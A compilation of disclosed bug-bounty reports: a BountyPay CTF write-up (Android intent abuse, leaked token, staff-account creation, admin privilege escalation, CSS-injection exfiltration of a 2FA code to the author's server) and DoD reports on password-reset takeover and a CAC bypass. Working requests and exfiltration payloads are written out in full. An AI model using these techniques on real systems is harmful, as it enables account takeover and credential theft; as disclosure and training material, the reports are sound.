        <activity android:label="@string/title_activity_part_two" android:name="bounty.pay.PartTwoActivity" android:theme="@style/AppTheme.NoActionBar">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="part" android:scheme="two"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/title_activity_part_one" android:name="bounty.pay.PartOneActivity" android:theme="@style/AppTheme.NoActionBar">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="part" android:scheme="one"/>
            </intent-filter>
        </activity>
        <activity android:name="bounty.pay.MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
```

I installed the app on an Android device and started it. I was greeted with a form asking me for my username and twitter handle, once I created a username I landed on PartOneActivity:

{F853784}

There was not much to interact with, but reading the code gave me a lot of information about what to do here:

```java
if (this.getIntent() != null && this.getIntent().getData() != null) {
            String var2 = this.getIntent().getData().getQueryParameter("start");
            if (var2 != null && var2.equals("PartTwoActivity") && var4.contains("USERNAME")) {
                var2 = var4.getString("USERNAME", "");
                Editor var3 = var4.edit();
                String var5 = var4.getString("TWITTERHANDLE", "");
                var3.putString("PARTONE", "COMPLETE").apply();
                this.logFlagFound(var2, var5);
                this.startActivity(new Intent(this, PartTwoActivity.class));
            }
}
```

What did the code tell me? Well, there is not much to do on this activity, but if I invoke it with the right parameters, it will save my progress and start PartTwoActivity for me. Note that I tried to bypass the PartOneActivity completely by firing an intent for PartTwo, but that didn't work. I still have to log the fact we successfully went through PartOne.

Based on the AndroidManifest file, I knew the intent URL to interact with PartOneActivity is `one://part` , and the code tells me it's expecting a `start=PartTwoActivity` parameter. I managed to reach PartTwoActivity using the following adb command:

```bash
$ adb shell am start -a android.intent.action.VIEW -d "one://part?start=PartTwoActivity"
```

{F853786}

When I clicked on the BountyPay logo, the app showed a message telling me some information was currently hidden. By looking at the code I figured out how to make the information visible:

```java
if (this.getIntent() != null && this.getIntent().getData() != null) {
            Uri var5 = this.getIntent().getData();
            String var7 = var5.getQueryParameter("two");
            String var8 = var5.getQueryParameter("switch");
            if (var7 != null && var7.equals("light") && var8 != null && var8.equals("on")) {
                var2.setVisibility(0);
                var3.setVisibility(0);
                var6.setVisibility(0);
            }
}
```

Passing the params `two=light&switch=on` should unhide the elements. That's what I did with adb:

```bash
$ adb shell am start -a android.intent.action.VIEW -d "two://part?two=light\&switch=on"
```

This started the activity again, but this time some new elements were visible:

{F853787}

In the activity, the code that handles the submit event looks like this:

```java
public void onDataChange(DataSnapshot var1) {
                String var2x = (String)var1.getValue();
                SharedPreferences var3 = PartTwoActivity.this.getSharedPreferences("user_created", 0);
                Editor var6 = var3.edit();
                String var4 = var2;
                StringBuilder var5 = new StringBuilder();
                var5.append("X-");
                var5.append(var2x);
                if (var4.equals(var5.toString())) {
                    var2x = var3.getString("USERNAME", "");
                    String var7 = var3.getString("TWITTERHANDLE", "");
                    PartTwoActivity.this.logFlagFound(var2x, var7);
                    var6.putString("PARTTWO", "COMPLETE").apply();
                    PartTwoActivity.this.correctHeader();
                } else {
                    Toast.makeText(PartTwoActivity.this, "Try again! :D", 0).show();
                }

}
```

The code compares the input with a string that starts with `X-` followed by the content of `var2x.` unfortunately I couldn't find what the value of `var2x` was in this activity. Based on the content of PartThreeActivity, I guessed it was something like `X-Token: xxx`. I tried submitting the displayed hash, without success. After some time I realized I only needed the header name. I submitted `X-Token` and landed on PartThreeActivity.

{F853788}

Here again, some elements seemed to be hidden, the code that unhides the elements was similar to the one in PartTwo, but with a twist:

```java
if (this.getIntent() != null && this.getIntent().getData() != null) {
            Uri var5 = this.getIntent().getData();
            final String var10 = var5.getQueryParameter("three");
            final String var9 = var5.getQueryParameter("switch");
            final String var11 = var5.getQueryParameter("header");
            byte[] var6 = Base64.decode(var10, 0);
            byte[] var7 = Base64.decode(var9, 0);
            final String var12 = new String(var6, StandardCharsets.UTF_8);
            final String var13 = new String(var7, StandardCharsets.UTF_8);
            this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {
                public void onCancelled(DatabaseError var1) {
                    Log.e("TAG", "onCancelled", var1.toException());
                }

                public void onDataChange(DataSnapshot var1) {
                    String var4 = (String)var1.getValue();
                    if (var10 != null && var12.equals("PartThreeActivity") && var9 != null && var13.equals("on")) {
                        String var2x = var11;
                        if (var2x != null) {
                            StringBuilder var3 = new StringBuilder();
                            var3.append("X-");
                            var3.append(var4);
                            if (var2x.equals(var3.toString())) {
                                var8.setVisibility(0);
                                var2.setVisibility(0);
                                PartThreeActivity.this.thread.start();
                            }
                        }
                    }

                }
            });
}
```

Some parameters must be base64 encoded and a header value must be provided. The adb command looks like this:

```bash
$ adb shell am start -a android.intent.action.VIEW -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk%3D\&switch=b24%3D\&header=X-Token"
```

This revealed a form where I was asked to submit a leaked hash:

 

{F853789}

What leaked hash? I started looking around, double clicking on the BountyPay logo told me to check for leaks. I checked the logs using logcat and found this:

```
TOKEN IS: : 8e9998ee3137ca9ade8f372739f062c1
HEADER VALUE AND HASH : X-Token: 8e9998ee3137ca9ade8f372739f062c1
```

I submitted the hash and voilà!

{F853791}

When I then clicked on the logo I saw a message that told me the information I got from the app might be useful, let's see.


# Creating a staff account using the leaked API token and some social network intel

Remember the **401 Unauthorized** response I got when I tried accessing the [https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/](https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/) endpoint directly? The error message mentioned a missing token. I tried again, but this time with the X-Token header:

```
GET /api/accounts/F8gHiqSdpK/ HTTP/1.1
Host: api.bountypay.h1ctf.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Connection: close
X-Token: 8e9998ee3137ca9ade8f372739f062c1
```

And I got some data back:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 20:20:27 GMT
Content-Type: application/json
Connection: close
Content-Length: 81

{"account_id":"F8gHiqSdpK","owner":"Mr Brian Oliver","company":"BountyPay Demo "}
```

Knowing the token was valid for this API, I started fuzzing again, using the token in the headers. I found an interesting endpoint: 

```
# ffuf -u https://api.bountypay.h1ctf.com/api/FUZZ -w ~/lists/content_discovery_all.txt -ac -H 'X-Token: 8e9998ee3137ca9ade8f372739f062c1'                                                  
                                                                                                          
        /'___\  /'___\           /'___\                                                                   
       /\ \__/ /\ \__/  __  __  /\ \__/           
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                  
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                                                                             
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       
                                                     
       v1.1.0-git                                
________________________________________________                                                          
                                                                                                          
 :: Method           : GET                                                                                
 :: URL              : https://api.bountypay.h1ctf.com/api/FUZZ                                           
 :: Header           : X-Token: 8e9998ee3137ca9ade8f372739f062c1                                          
 :: Follow redirects : false                     
 :: Calibration      : true                                                                               
 :: Timeout          : 10                            
 :: Threads          : 40                                                                                 
 :: Matcher          : Response status: 200,204,301,302,307,401,403                                       
________________________________________________                                                                                                                                                                     
                                                                                                                                                                                                                     
staff/                  [Status: 200, Size: 104, Words: 3, Lines: 1]
staff                   [Status: 200, Size: 104, Words: 3, Lines: 1]
:: Progress: [373535/373535] :: Job [1/1] :: 2146 req/sec :: Duration: [0:02:54] :: Errors: 4 ::
```

This looked very interesting, a GET request to this endpoint gave me a list of staff members:

```
[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
```

I tried a POST request and got the following response back:

```
HTTP/1.1 400 Bad Request
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 20:41:43 GMT
Content-Type: application/json
Connection: close
Content-Length: 21

["Missing Parameter"]
```

I played around a bit and after some time I found out the required parameter was `staff_id`. I tried passing an existing staff id, but it didn't work, I got an error saying the staff member already had an account. I also tried a random ID, no luck, it had to be a valid staff ID from a staff member that didn't had an account yet. That's where the social network intel was useful. Few weeks ago one of the new BountyPay employees posted a message on twitter, mentioning `@BountyPayHQ`:

{F853796}

The badge on this picture contains a staff ID. I tried creating an account using it and it worked:

```
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Content-Length: 23
Content-Type: application/x-www-form-urlencoded

staff_id=STF:8FJ3KFISL3
```

Response:

```
HTTP/1.1 201 Created
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 20:53:53 GMT
Content-Type: application/json
Connection: close
Content-Length: 110

{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```

Now I have a staff account, it's time to use it!


# Privilege escalation, from regular staff member to admin

The BountyPay home page has two login options: app and staff. I already covered the app part when I explained how I logged in as brian.oliver at the very beginning. After I created a staff account it was time to explore the staff portal. On the home page, I selected the login → staff option. I used sandra's username and password on the login form and I got access to the staff portal:

{F853792}

The staff portal is composed of multiple tabs:

- Home tab: Nothing there
- Support Tickets tab: allows staff members to read support tickets sent to them. This tab contains an automated message sent by Admin, but there is no way to reply to it:

{F853794}

- Profile tab: This is where the staff member can update his avatar and profile name:

{F853793}

Nothing really exciting so far, but the Javascript code was more interesting. Here is the content of the `website.js` file that is loaded by the portal:

```jsx
$('.upgradeToAdmin').click(function () {
  let t = $('input[name="username"]').val();
  $.get('/admin/upgrade?username=' + t, function () {
    alert('User Upgraded to Admin')
  })
}),
$('.tab').click(function () {
  return $('.tab').removeClass('active'),
  $(this).addClass('active'),
  $('div.content').addClass('hidden'),
  $('div.content-' + $(this).attr('data-target')).removeClass('hidden'),
  !1
}),
$('.sendReport').click(function () {
  $.get('/admin/report?url=' + url, function () {
    alert('Report sent to admin team')
  }),
  $('#myModal').modal('hide')
}),
document.location.hash.length > 0 && ('#tab1' === document.location.hash && $('.tab1').trigger('click'), '#tab2' === document.location.hash && $('.tab2').trigger('click'), '#tab3' === document.location.hash && $('.tab3').trigger('click'), '#tab4' === document.location.hash && $('.tab4').trigger('click'));
```

This code discloses an interesting endpoint, `/admin/upgrade`, which can be used to promote a staff member to the Admin role by passing its username as GET parameter. I tried to make the admin call that URL using the `report` function, but it didn't work since admin pages are ignored, as explained in the modal dialog:

{F853785}

How to send a report about a non admin page, but still trigger that call to upgrade? That's very tricky, but still possible using Javascript. On this portal, the JS code declares handlers for the `click` event on multiple classes:

- The handler on the `tab` class, to switch between tabs
- The handler on the `upgradeToAdmin` class, which might correspond to a button on the admin interface. When clicked it triggers the call to `/admin/upgrade`
- The handler on the `sendReport` class, that is triggered when the Report Now button is clicked

On top of that, the JS code also looks at the `location.hash` variable, and automatically fires a click event on the tab that is passed as a hash value in the URL. For example, the URL [https://staff.bountypay.h1ctf.com/?template=home#tab2](https://staff.bountypay.h1ctf.com/?template=home#tab2) would load the portal and the JS code would then trigger a `click` event on the `tab2`, which will then fire the tab switching function. What if I could do the same but with `upgradeToAdmin` instead?

Unfortunately I couldn't just pass `#upgradeToAdmin` to the URL, this wouldn't trigger anything since there is no JS code checking for that. The solution here is to find, or create an element that has both classes: `tabX` and `upgradeToAdmin`. 

This can be done using the avatar selection feature from the profile tab. The avatar image is actually set using a class name, by intercepting the avatar change request and changing its value to `tab1%20upgradeToAdmin` I managed to create an element that has both classes:

```
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: https://staff.bountypay.h1ctf.com
Connection: close
Referer: https://staff.bountypay.h1ctf.com/?template=home
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

profile_name=sandra&profile_avatar=tab1%20upgradeToAdmin
```

{F853776}

After doing this, saw the call to the upgrade endpoint being fired when I opened this URL: [https://staff.bountypay.h1ctf.com/?template=home#tab1](https://staff.bountypay.h1ctf.com/?template=home#tab1)

{F853778}

The username was still undefined, but I'll cover this part later. First I'd like to explain how this worked. By creating an element that has both classes, `tab1` and `upgradeToAdmin`, I created an element that was a valid target for the `$('.tab1')` selector which is used to trigger a `click` event when the `#tab1` hash is present, and since this `click` event was triggered on an element that also had the `upgradeToAdmin` class, it fired the handler for this class and called the `upgrade` endpoint.

At that point I managed to get a call to the upgrade endpoint, but the username was still undefined. The username value is extracted using the `$('input[name="username"]')` selector. This element exists in the login template and it's possible to pre-fill the value using the `username` query parameter. Doing so I was able to bring the `username` input field in scope, but I lost the `website.js` file my element with my "avatar" class. I had to find a way to load both templates at the same time. After playing around with the `template` parameter, I managed to load both `home` and `login` templates using the PHP multi-values syntax: [https://staff.bountypay.h1ctf.com//?template[]=login&template[]=home&template[]=ticket&ticket_id=3582&username=sandra.allison#tab1](https://staff.bountypay.h1ctf.com//?template%5B%5D=login&template%5B%5D=home&template%5B%5D=ticket&ticket_id=3582&username=sandra.allison#tab1)

Note that I had to also load the ticket template and load the ticket the Admin sent to sandra. This was necessary to bring sandra's "avatar" in scope and make the click event work:

{F853779}

The final step was then to encode that URL in base64 and report it to the admin:

```
GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109aG9tZSZ0ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ1c2VybmFtZT1zYW5kcmEuYWxsaXNvbiN0YWIx HTTP/1.1
Host: staff.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://staff.bountypay.h1ctf.com//?template[]=login&template[]=home&template[]=ticket&ticket_id=3582&username=sandra.allison
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NVRQRC8rV01aenlqQ2pWU0lGNUlpYkRlOXlZWk1BR0hqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHb2lxaC9mWlFkZmNpdWZDVmJVNnNLOHFLT0svRkJSY0MwNTcyMEs4c1lyUzE3UT09
Pragma: no-cache
Cache-Control: no-cache
```

Response:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 01 Jun 2020 04:14:38 GMT
Content-Type: application/json
Connection: close
Set-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NVRQRC8rV01aenlqQ2pWU0lGNUlpYkRlOXlZWk1BR0hqTzFPaWQ0bDA0M2xZdXozYkJqRURhdXczckZGTWlCSGtVR3lDU3FycUZGUjY0QXNHbzMybnJQZFZkYUIwc3ZpVWJ4VCtLWmZhYS83Q0IwTlNncy93aDZrbFlPTzE3UT09; expires=Fri, 03-Jul-2020 04:14:38 GMT; Max-Age=2592000; path=/
Content-Length: 19

["Report received"]
```

The response contained a new cookie with Admin permissions. With those permissions I was able to retrieve the CEO's username and password:

{F853773}


# Taking over the CEO's account and making the payments

Using Marten's credentials I was able to log in to his account. I had to bypass the 2FA the exact same way I did for Brian Oliver at the very beginning. Once I was logged in I checked all the dates for pending transaction. I saw that 1 transaction in May 2020 was waiting to be processed:

{F853795}

I clicked on the *Pay* button, but the payment process was protected by 2FA. This time the 2FA system seemed to be a bit different than the one used for the login process:

{F853781}

{F853782}

I checked the requests in Burp Suite and found something interesting in the POST request that sends the payment challenge to the 2FA app:

```
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: https://app.bountypay.h1ctf.com
Connection: close
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9
Upgrade-Insecure-Requests: 1

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

I checked the content of the css file that `app_style` parameter was referring to and saw this:

```css
/**
Template for the UNI 2FA App
 */

body {
    background-color: #FFFFFF;
}

div.branding {
    height:80px;
    width:80px;
    margin:20px auto 40px auto;
    background-image:url("https://www.bountypay.h1ctf.com/images/bountypay.png");
    background-position:center center;
    background-repeat: no-repeat;
    background-size: cover;
}
```

From that. I made the following assumptions:

- The 2FA system uses a *UNI 2FA App*
- It's possible to define the css the app will use when requesting the code
- The code length is 7 chars max. (I got this information from the HTML in the 2FA page)

I changed the css URL in the request for a URL that points to one of my servers and noticed that the file was actually fetched:

```
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: https://app.bountypay.h1ctf.com
Connection: close
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9
Upgrade-Insecure-Requests: 1

app_style=https://foo.x.0xcc.ovh/test.css
```

```
3.21.98.146 - - [02/Jun/2020:12:38:14 +0000] "GET /test.css HTTP/2.0" 200 46102 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
```

At that point I knew I could try data exfiltration via CSS injection. You can read more about this technique [here](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d) First I tried with a very simple CSS file, to validate the exfiltration would actually work:

```css
input {background-image:url("https://foo.x.0xcc.ovh/input.jpg");}
```

I re-sent the POST request above and got a callback to my server, awesome! I then generated a CSS with selectors for all printable ASCII chars:

```css
input[value^="0"] {background-image:url("https://foo.x.0xcc.ovh/0.jpg");}
input[value^="1"] {background-image:url("https://foo.x.0xcc.ovh/1.jpg");}
input[value^="2"] {background-image:url("https://foo.x.0xcc.ovh/2.jpg");}
...
```

It still seemed to work, I got callbacks. I tried again with 2 chars selectors:

```css
input[value^="00"] {background-image:url("https://foo.x.0xcc.ovh/00.jpg");}
input[value^="01"] {background-image:url("https://foo.x.0xcc.ovh/01.jpg");}
input[value^="02"] {background-image:url("https://foo.x.0xcc.ovh/02.jpg");}
...
```

And, nothing! After playing around a bit, I figured out the app must probably use one input field for each character. I generated a CSS file to take this into account:

```css
input[value^="0"]:nth-child(1) {background-image:url("https://foo.x.0xcc.ovh/1_0.jpg");}
input[value^="1"]:nth-child(1) {background-image:url("https://foo.x.0xcc.ovh/1_1.jpg");}
input[value^="2"]:nth-child(1) {background-image:url("https://foo.x.0xcc.ovh/1_2.jpg");}
...
input[value^="0"]:nth-child(2) {background-image:url("https://foo.x.0xcc.ovh/2_0.jpg");}
input[value^="1"]:nth-child(2) {background-image:url("https://foo.x.0xcc.ovh/2_1.jpg");}
input[value^="2"]:nth-child(2) {background-image:url("https://foo.x.0xcc.ovh/2_2.jpg");}
...
...
input[value^="x"]:nth-child(7) {background-image:url("https://foo.x.0xcc.ovh/7_x.jpg");}
input[value^="y"]:nth-child(7) {background-image:url("https://foo.x.0xcc.ovh/7_y.jpg");}
input[value^="z"]:nth-child(7) {background-image:url("https://foo.x.0xcc.ovh/7_z.jpg");}
```

I re-sent the POST request and bingo!

```
3.21.98.146 - - [02/Jun/2020:13:19:19 +0000] "GET /test.css HTTP/2.0" 200 46102 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
3.21.98.146 - - [02/Jun/2020:13:19:19 +0000] "GET /1_a.jpg HTTP/2.0" 404 176 "https://h1.x.0xcc.ovh/test.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
3.21.98.146 - - [02/Jun/2020:13:19:19 +0000] "GET /2_x.jpg HTTP/2.0" 404 176 "https://h1.x.0xcc.ovh/test.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
3.21.98.146 - - [02/Jun/2020:13:19:19 +0000] "GET /3_9.jpg HTTP/2.0" 404 176 "https://h1.x.0xcc.ovh/test.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
3.21.98.146 - - [02/Jun/2020:13:19:19 +0000] "GET /4_l.jpg HTTP/2.0" 404 176 "https://h1.x.0xcc.ovh/test.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
3.21.98.146 - - [02/Jun/2020:13:19:19 +0000] "GET /5_B.jpg HTTP/2.0" 404 176 "https://h1.x.0xcc.ovh/test.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
3.21.98.146 - - [02/Jun/2020:13:19:19 +0000] "GET /6_C.jpg HTTP/2.0" 404 176 "https://h1.x.0xcc.ovh/test.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
3.21.98.146 - - [02/Jun/2020:13:19:19 +0000] "GET /7_t.jpg HTTP/2.0" 404 176 "https://h1.x.0xcc.ovh/test.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
```

I then entered the 2FA code `ax9lBCt`, and the payment got processed:

 

{F853774}

The flag: ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$

## Impact

All hackers are paid!

---

### [████ - Complete account takeover](https://hackerone.com/reports/566811)

- **Report ID:** `566811`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cablej_dds
- **Bounty:** - usd
- **Disclosed:** 2020-05-11T16:49:56.744Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

███████ ██████████ was updated today (03/04), which includes a backend rewrite. Unfortunately, the new site is insecure and allows a password to be reset given only a username. This allows access to payment records for any DoD employee given only their username, which is commonly known. Further, ███ is used to authenticate to other sites such as ██████. Thus, this allows access to the complete ████████ record and other associated information (despite ████████ stating that ██████████ login is disabled, it still works).

## Impact

Trivial and complete compromise of any/all ████████ ███████ accounts, resulting in exposure and modification of sensitive financial records for all DoD civilian/military personnel. For instance, this exposes partial social security numbers, personal addresses, and pay history, and allows stealing funds by changing direct deposit information. Further, via associated sites (█████), this exposes the ██████ of all military service members.

## Step-by-step Reproduction Instructions

1. Visit https://████████/ and intercept a request to obtain valid cookies.
2. Make the following request, replacing the cookies with your new cookies if needed:

```
POST /api/session/personalsettings/ForgotPasswordChangeRequest HTTP/1.1
Host: ███
Connection: close
Content-Length: 151
Accept: application/json, text/plain, */*
Origin: https://█████████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Content-Type: application/json
Referer: https://████████/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: LastMRH_Session=█████; F5_ST=██████; MRHSession=████████████████████

{"Username":"x","Password":"y","IsLimitedAccessAccount":false,"HasNagC":false,"HasNagF":false,"HasNagM":false,"HasNagN":false}
```

3. Enter any user's username and a new password.
4. Submit the request. The user's password will be overwritten to the new password, and you may now log in.
5. Visit https://██████/milconnect/. Select to log in via █████. Despite the message saying it is disabled, edit the form via developer tools to enable both text boxes and the login button. Enter the user's credentials.
6. The login will be successful, allowing full access to the user's ███.

## Suggested Mitigation/Remediation Actions

Enforce social security number / security questions / email verification.

## Impact

.

---

### [█████ - Pre-generation of VIEWSTATE allows CAC bypass](https://hackerone.com/reports/496219)

- **Report ID:** `496219`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cablej_dds
- **Bounty:** - usd
- **Disclosed:** 2020-05-11T16:44:53.459Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

As of today, ███ is back online (https://███████).

█████████ allows users to check a box labeled `Require CAC for Pick-up`. This option requires users to present their CAC in order to download files. As explained by ███:

> Choosing this option, however, does add a significant degree of assurance that the recipient is in fact who they claim to be by verifying their identity via the CAC.

However, this security control can be bypassed, allowing downloading files without CAC authentication.

(Note that a CAC bypass was reported in #429000. Since then, ████████ has deployed a patch for that report, although a different bypass is possible.)

**Description:**

The `pickupfiles.aspx` page is where recipients of both non-CAC and CAC-enforced files visit to retrieve files. If the file is CAC enforced, the user is redirected to `CACPickup.aspx`. If not, the user must present their password in order to download the file.

For requests that are not CAC enforced, the server generates a MAC enabled `VIEWSTATE` parameter containing the package ID. This package ID in the viewstate is then checked against the package ID in the request to ensure that the user is downloading the correct file. As the viewstate is MAC enabled, it is not possible to modify the parameter without the server throwing an error.

The challenge lies in obtaining a valid viewstate for a CAC-enabled file. The server does not return a viewstate for CAC files, instead immediately redirecting to the CAC pickup page. However, this can be bypassed by pre-generating a viewstate for possible future request IDS (these are incremental). Then, when an attacker wishes to bypass CAC authentication, they can simply lookup the pre-generated viewstate and make a valid request to download the file.

## Impact

This allows bypass of CAC authentication for picking up files, a significant security control on ███████.

## Step-by-step Reproduction Instructions

1. Send a test file on https://█████████ to see the most recent package ID.
2. Using a tool such as Burp Intruder, enumerate package IDs in the request to https://████████/safe/pickupfiles.aspx?id=package_id, beginning at the most recent package ID. A large number of viewstates can be computed in advance. For testing, I computed a couple hundred.
3. As a normal user, send a file transfer to yourself, enforcing the CAC required option.
4. Visiting the `pickupfiles.aspx` link in the file transfer email, observe that CAC authentication is enforced.
5. Look up the package ID in your table of pre-generated requests. Make a request with the associated viewstate and validation parameter (e.g. in Burp Suite, right click -> show response in browser) and enter the sent password.
6. Observe that the validation of the viewstate parameter passes, and you may now download the file.

## Suggested Mitigation/Remediation Actions

Prevent users from downloading files from `pickupfiles.aspx` when the file is CAC-enabled.

## Impact

.

---

### [Outdated Coturn is vulnerable to known vulnerabilities (High)](https://hackerone.com/reports/843263)

- **Report ID:** `843263`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** 8x8
- **Reporter:** @sandrogauci
- **Bounty:** - usd
- **Disclosed:** 2020-04-13T19:48:35.599Z
- **CVE(s):** CVE-2018-4059, CVE-2018-4056, CVE-2018-4058, CVE-2020-6062, CVE-2020-6061

**Summary (team):**

Jitsi had several CoTurn servers that needed improvements to their access configurations and updated.

---

### [Account Take over of millions of  MTN users account due to lack of Rate limiting when sending OTP code](https://hackerone.com/reports/761000)

- **Report ID:** `761000`
- **Severity:** High
